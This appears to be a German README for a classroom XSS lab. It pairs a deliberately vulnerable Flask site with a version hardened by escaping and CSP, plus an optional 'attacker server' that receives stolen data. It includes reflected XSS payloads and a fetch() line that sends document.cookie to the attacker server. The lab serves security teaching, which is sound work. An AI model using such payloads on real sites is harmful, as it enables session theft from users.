# 🚀 Projekt starten - Schnellanleitung

## Übersicht

Dieses Projekt hat **3 Server** die du starten kannst:

| Server | Port | Beschreibung | Benötigt |
|--------|------|--------------|----------|
| **Unsicure Website** | 5000 | ⚠️ VERWUNDBAR - Reflected XSS | ✅ PFLICHT |
| **Secure Website** | 6000 | ✅ GESCHÜTZT - Input Sanitization + CSP | ✅ PFLICHT |
| **Attacker Server** | 3000 | 🎯 Fängt gestohlene Daten ab | 📌 OPTIONAL |

---

## ⚡ Schnellstart

### 1️⃣ Terminal 1: Unsicure Website starten

```bash
cd unsecurepage
python server.py
```

✅ Server läuft auf: **http://localhost:5000**

**Das kannst du testen:**
- `http://localhost:5000/?search=<img src=x onerror=alert(1)>`
- `http://localhost:5000/?promo=<script>alert('XSS')</script>`

---

### 2️⃣ Terminal 2: Secure Website starten

```bash
cd securepage
python server_secure.py
```

✅ Server läuft auf: **http://localhost:6000**

**Das kannst du testen:**
- `http://localhost:6000/?search=<img src=x onerror=alert(1)>` → ❌ BLOCKIERT!
- Alle XSS-Payloads werden escaped angezeigt

---

### 3️⃣ Terminal 3 (OPTIONAL): Attacker Server starten

```bash
cd AttServ
npm start
```

✅ Server läuft auf: **http://localhost:3000**

**Wofür braucht man das?**
- Um gestohlene Cookies zu empfangen
- Um Keylogger-Daten zu sehen
- Für fortgeschrittene XSS-Angriffe

**Payload mit Attacker Server:**
```
http://localhost:5000/?search=<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
```

---

## 🔍 Burp Suite Testing

### Reflected XSS nachweisen:

1. **Burp Proxy aktivieren**
2. **Request senden:**
   ```http
   GET /?search=<img src=x onerror=alert(1)> HTTP/1.1
   Host: localhost:5000
   ```
3. **In der Response siehst du:**
   ```html
   <span style="..."><img src=x onerror=alert(1)></span>
   ```

🎯 **Das ist der Beweis für Reflected XSS!** Der Payload steht direkt in der HTTP-Response!

---

## 📊 Vergleich: Unsicure vs. Secure

| Feature | Unsicure (Port 5000) | Secure (Port 6000) |
|---------|---------------------|-------------------|
| Input Sanitization | ❌ Keine | ✅ `escape()` |
| Content Security Policy | ❌ Keine | ✅ CSP Header |
| XSS möglich? | ✅ JA | ❌ NEIN |
| Für Burp Demo | ✅ Perfekt | ❌ Blockiert alles |

---

## 🎯 Projekt-Architektur

```
XSS_Projekt/
├── unsecurepage/
│   ├── server.py           ← Flask Server (Port 5000) VERWUNDBAR
│   ├── style.css
│   ├── script.js
│   └── index.html          ← Alte Version (nicht mehr benutzt)
│
├── securepage/
│   ├── server_secure.py    ← Flask Server (Port 6000) GESCHÜTZT
│   └── stylesecure.css
│
├── AttServ/
│   └── server.js           ← Node.js Server (Port 3000) OPTIONAL
│
└── payloads.md             ← Alle XSS-Payloads dokumentiert
```

---

## 🤔 Welchen Server brauche ich?

### Für Burp Suite Testing:
- ✅ **Unsicure Website** (Port 5000) - PFLICHT
- ❌ Secure Website - nicht nötig
- ❌ Attacker Server - nicht nötig

### Für vollständige Demo (Cookie-Diebstahl):
- ✅ **Unsicure Website** (Port 5000) - PFLICHT
- ✅ **Attacker Server** (Port 3000) - PFLICHT
- ❌ Secure Website - optional zum Vergleich

### Für Vergleich (Schutzmaßnahmen zeigen):
- ✅ **Unsicure Website** (Port 5000) - PFLICHT
- ✅ **Secure Website** (Port 6000) - PFLICHT
- ❌ Attacker Server - nicht nötig

---

## ❓ FAQ

**Q: Brauche ich den Attacker Server?**
A: Nein, nur wenn du Cookie-Diebstahl demonstrieren willst. Für Burp Suite reicht die unsicure Website.

**Q: Welcher Server für Burp Suite?**
A: Nur die unsicure Website (Port 5000).

**Q: Warum 2 Python Server?**
A: Einer ist verwundbar (demonstriert XSS), einer ist sicher (demonstriert Schutz).

**Q: Was ist der Unterschied zu vorher?**
A: Vorher: SimpleHTTPServer = DOM-based XSS (JavaScript im Browser)
   Jetzt: Flask Server = Reflected XSS (Server reflektiert Input)

---

## ✅ Checkliste: Alles bereit?

- [ ] Python Dependencies installiert (`pip install -r requirements.txt`)
- [ ] Node.js Dependencies installiert (`cd AttServ && npm install`)
- [ ] Unsicure Website läuft auf Port 5000
- [ ] Secure Website läuft auf Port 6000 (optional)
- [ ] Attacker Server läuft auf Port 3000 (optional)
- [ ] Burp Proxy konfiguriert (falls du Burp nutzt)

---

## 🎓 Lernziele

Nach diesem Projekt verstehst du:
- ✅ Unterschied zwischen **Reflected XSS** und **DOM-based XSS**
- ✅ Wie man XSS-Schwachstellen mit **Burp Suite** nachweist
- ✅ Wie **Input Sanitization** (escape) schützt
- ✅ Wie **Content Security Policy (CSP)** schützt
- ✅ Wie Angreifer **Cookies stehlen** können
- ✅ Wie man eine Anwendung **gegen XSS absichert**

Viel Erfolg! 🚀
